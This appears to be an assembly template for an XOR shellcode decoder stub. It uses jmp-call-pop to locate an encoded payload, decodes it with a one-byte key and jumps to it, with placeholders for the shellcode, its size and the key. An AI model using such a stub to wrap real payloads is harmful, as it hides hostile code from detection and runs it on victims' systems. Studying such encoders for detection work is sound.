bits 64

jmp short shell

ret:
    pop rsi
    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx

    mov bl, {encoded_shellcode_size}
    mov al, {xor_key}

loop:
    xor [rsi+rcx], rax
    inc rcx
    cmp rbx, rcx
    jne loop
    jmp rsi


shell:
    call ret
    shellcode db {shellcode}
